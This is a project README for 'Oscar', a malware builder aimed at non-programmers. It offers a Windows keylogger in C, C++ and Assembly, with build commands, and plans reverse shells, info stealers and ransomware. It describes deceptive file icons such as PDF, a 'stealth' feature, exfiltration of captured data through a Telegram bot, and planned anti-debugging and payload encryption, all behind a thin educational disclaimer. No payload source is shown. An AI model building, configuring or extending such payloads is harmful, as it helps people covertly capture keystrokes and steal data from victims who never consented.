<p align="center">
  <img src="https://i.imgur.com/uAcYBFj.gif" width="850">
</p>

<h1 align="center">🎯 Oscar</h1>

<p align="center">
  <b>Modular Payload Generation Framework</b>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-blue?style=for-the-badge">
  <img src="https://img.shields.io/badge/language-C%20%7C%20C++%20%7C%20Python%20%7C%20Assembly-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/status-Active-brightgreen?style=for-the-badge">
</p>

---

# ⚠️ Disclaimer

This repository exists strictly for:
- educational purposes
- malware analysis research
- authorized security testing

**Unauthorized use is illegal and unethical.**

---

# 📌 What is Oscar?

**Oscar** is a modular payload generation framework.  
You don't need to be a programmer — just choose your payload, language, and platform, and Oscar builds it for you.

Currently focused on **Windows**, with **Linux** and **macOS** on the roadmap.

---

# 🧩 Currently Supported

## Platforms
| Platform | Status |
|----------|--------|
| Windows  | ✅ Active |
| Linux    | 🚧 Planned |
| macOS    | 📝 Planned |

## Payloads
| Payload | Status |
|---------|--------|
| Keylogger | ✅ Available |
| Reverse Shell | 🚧 Planned |
| Info Stealer | 📝 Planned |
| Ransomware | 📝 Planned |

## Languages (per payload)
| Language | Status |
|----------|--------|
| C        | ✅ Available |
| C++      | ✅ Available |
| Assembly | ✅ Available |
| Python   | 🚧 Planned |
| Bash     | 📝 Planned |

---

# 📁 Project Structure

```
Oscar/
│
├── Payloads/                         ← All payloads live here
│   ├── windows/
│   │   ├── keylogger/                ← Windows Keylogger
│   │   │   ├── Assembly/
│   │   │   │   └── keylog.asm
│   │   │   ├── C/
│   │   │   │   └── keylog.c
│   │   │   └── C++/
│   │   │       └── keylog.cpp
│   │   └── reverse_shell/            ← Coming soon
│   ├── linux/
│   │   └── reverse_shell/            ← Coming soon
│   └── mac-os/
│       └── todo/                     ← Coming soon
│
├── builder/                          ← Core builder logic
│   └── payload_selector.py
│
├── config/
│   └── payloads_config.json          ← Payload registry
│
├── icon/                             ← Deceptive icons
├── modules/                          ← Helper modules
├── Oscar.py                          ← Main entry point
└── README.md
```

---

# 🛠️ Current Languages & Build Instructions

## 1. C
**Path:** `Payloads/windows/keylogger/C/keylog.c`

```
gcc -o keylogger.exe keylog.c -lcurl -lws2_32 -lwinhttp -lcrypt32 -luser32 -ladvapi32 -O2 -mwindows -std=c99
```

---

## 2. C++
**Path:** `Payloads/windows/keylogger/C++/keylog.cpp`

```
g++ -o keylogger.exe keylog.cpp -lcurl -lws2_32 -lwinhttp -lcrypt32 -luser32 -ladvapi32 -O2 -mwindows
```

---

## 3. Assembly (MASM)
**Path:** `Payloads/windows/keylogger/Assembly/keylog.asm`

```
ml /c /coff /Cp keylog.asm
link /SUBSYSTEM:WINDOWS /OUT:keylogger.exe keylog.obj
```

---

## 4. Assembly (NASM)
**Path:** `Payloads/windows/keylogger/Assembly/keylog.asm`

```
nasm -f win32 keylog.asm -o keylog.obj
gcc -o keylogger.exe keylog.obj -lkernel32 -luser32 -lws2_32
```

---

# ➕ How to Add Your Own Payload

Oscar is designed to be **extensible**. You can add your own payloads easily.

## Step 1: Create the folder structure

```
Payloads/
└── <platform>/
    └── <payload_name>/
        └── <language>/
            └── <your_code>
```

### Example:
```
Payloads/
└── windows/
    └── my_tool/
        └── Python/
            └── my_script.py
```

---

## Step 2: Register your payload

Edit `config/payloads_config.json` and add your payload:

```
{
    "payloads": {
        "windows": {
            "my_tool": {
                "name": "My Custom Tool",
                "description": "Does something useful",
                "languages": ["python"],
                "default": "python",
                "icon": ["pdf"],
                "features": ["telegram", "stealth"]
            }
        }
    }
}
```

---

## Step 3: Use it

```
python Oscar.py --os windows --payload my_tool --lang python
```

---

## Guidelines for Adding Payloads

| Requirement | Description |
|-------------|-------------|
| **Folder Naming** | Use lowercase with underscores: `my_payload` |
| **Language Support** | At least one language implementation |
| **Telegram Support** | Recommended but optional |
| **Documentation** | Add a `README.md` inside your payload folder |
| **Testing** | Test in isolated VM before submitting |

---

# 🗺️ Roadmap (Planned Features)

| Feature | Status | ETA |
|---------|--------|-----|
| Linux Reverse Shell | 🚧 In Progress | Q3 2026 |
| macOS Support | 📝 Planned | Q4 2026 |
| Info Stealer Payload | 📝 Planned | Q4 2026 |
| Payload Encryption | 📝 Planned | Q1 2027 |
| GUI Builder (optional) | 💡 Idea | TBD |
| Anti-Debugging Techniques | 📝 Planned | Q1 2027 |

---

# 🔧 Installation

```
git clone https://github.com/Arash-abraham/Oscar.git
cd Oscar
pip install -r requirements.txt
```

---

# 💻 Usage

```
python Oscar.py
```

You will be prompted to:
- select platform (windows/linux/macos)
- select payload type
- select language
- enter Telegram Bot Token & Chat ID
- select icon (Windows only)

---

# 📧 Contact

📧 arashebi777@gmail.com

---

<p align="center">
  <i>Hack responsibly.</i>
</p>